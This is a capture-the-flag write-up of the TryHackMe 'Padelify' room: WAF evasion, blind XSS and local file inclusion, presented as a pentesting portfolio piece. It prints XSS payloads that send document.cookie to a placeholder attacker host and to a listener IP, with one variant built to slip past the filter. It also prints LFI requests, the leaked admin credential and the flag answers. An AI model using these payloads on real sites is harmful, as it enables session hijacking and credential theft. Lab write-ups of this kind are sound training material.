# 🏴‍☠️ TryHackMe: Padelify  
**Difficulty:** 🟠 Medium  

![Room Badge](https://tryhackme-badges.s3.amazonaws.com/manio11.png)

🔗 [View the room on TryHackMe](https://tryhackme.com/room/padelify)

---

> **Disclaimer:**  
> This write-up is for educational and professional demonstration purposes only.  
> All testing was performed in a controlled, authorized environment (TryHackMe).  
> No techniques described here were used against real-world systems.

---

## About This Write-Up
This document is part of my offensive security portfolio.  
My goal is to present structured, professional case studies that demonstrate practical penetration testing skills, clear reporting, and a real-world methodology.

These write-ups are meant to demonstrate practical offensive security skills relevant to junior pentesting, red teaming, and application security roles.

---

## 🧠 Summary
**Padelify** is a web exploitation challenge focused on **WAF bypass techniques**, **blind XSS exploitation**, and **local file inclusion (LFI)**.  
The attack chain involves bypassing a **signature-based Web Application Firewall**, stealing a **moderator session cookie via blind XSS**, and abusing a vulnerable `page` parameter to read sensitive configuration files.

**Key themes:**
- Web Application Firewall evasion  
- Blind Cross-Site Scripting (XSS)  
- Cookie exfiltration  
- Parameter fuzzing  
- Local File Inclusion (LFI)  
- URL encoding bypass techniques  

---

## 🧰 Tools & Techniques

| Tool / Technique | Purpose |
|------------------|---------|
| **nmap** | Port scanning & service discovery |
| **Gobuster** | Directory & parameter fuzzing |
| **curl** | Manual HTTP testing |
| **Python HTTP server** | XSS exfiltration listener |
| **CyberChef** | URL encoding |
| **WAF evasion** | User-Agent spoofing, string splitting |
| **Blind XSS** | Stored payload execution |

---

## 🚀 Attack Path

### 1. Reconnaissance with nmap

```bash
nmap -Pn 10.67.171.240
```
| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |

I navigated to 10.67.171.240:80 and there was a registration page and login page. I tried to make a registrate myself but got the message that the moderator needs to approve my details. in the login page i tried test as username and password and it worked. maybe this is a bug so i left it for wat is is and when on with the challenge. 

---

### 2. Initial Web Access & WAF Detection
```
curl 10.67.171.240
```
**Response:**
```html
403 FORBIDDEN  
Web Application Firewall is ACTIVE
```
**Observations:**
- Automated tools blocked
- Signature-based WAF detected

---

### 3. WAF Bypass (User-Agent Spoofing)
```bash
gobuster dir -u http://10.67.171.240/-w /usr/share/wordlists/dirb/common.txt-a Mozilla/5.0
```
**Results:**
| Path           | Status | Notes         |
| -------------- | ------ | ------------- |
| /config        | 301    | Interesting   |
| /logs          | 301    | Contains logs |
| /css           | 301    | Bootstrap     |
| /js            | 301    | Bootstrap     |
| /index.php     | 200    | Homepage      |
| /php.ini       | 403    | Blocked       |
| /server-status | 403    | Blocked       |

---

### 4. Log File Analysis
```lua
/logs/error.log
```
**Interesting entries:**
- Possible encoded/obfuscated XSS payload observed
- Failed to parse admin_info in /var/www/html/config/app.conf

---

### 5. Blind XSS Discovery
```html
<img src="http://10.67.101.111:8000" />
```
```bash
python3 -m http.server 8000
```
**Incoming traffic:**
```sql
GET / HTTP/1.1
```

---

### 6. WAF Evasion – Cookie Exfiltration

**Blocked:**
```html
<script> var i=new Image(); i.src="http://ATTACKER/?c="+document.cookie </script>
```
**Bypass:**
```html
<script> var i=new Image(); i.src="http://10.67.101.111:9001/?c="+document["coo"+"kie"] </script>
```
```bash
python3 -m http.server 9001
```
**Captured:**
```ini
PHPSESSID=e1omj7ther5rnh0g5ks70vjn84
```

---

### 7. Moderator Access
```text
THM{REDACTED}
```

---

### 8. Parameter Fuzzing – LFI
```bash
gobuster fuzz -u http://10.67.171.240/live.php?page=FUZZ -w /usr/share/wordlists/dirb/common.txt -a Mozilla/5.0 --exclude-length 1907
```

---

### 9. URL Encoding WAF Bypass
```bash
/live.php?page=%2Fconfig%2Fapp%2Econf
```
```ini
admin_info = "bL}8,S9W1o44"
```

---

### 10. Admin Access
```
THM{REDACTED}
```

---
## 🏁 Flags
| Flag      | Value                    |
| --------- | ------------------------ |
| Moderator | THM{Logged_1n_Moderat0r} |
| Admin     | THM{Logged_1n_Adm1n001}  |

---

## 💭 Reflection
**This room demonstrated how simple, signature-based WAFs can be bypassed using:**
- User-Agent spoofing
- String concatenation
- URL encoding
- Blind XSS showed how stored payloads can lead to full session hijacking.
- The LFI vulnerability demonstrated how poor input validation leads to credential disclosure.

**Key Takeaways:**
- WAFs ≠ security
- Blind XSS is extremely dangerous
- Encoding bypasses defeat filters
- Session hijacking = instant privesc
- Parameter fuzzing is powerful

**Lessons Learned:**
- Test what is filtered
- Break payloads apart
- Combine vulnerabilities
- Log files leak secrets
- Defense-in-depth matters
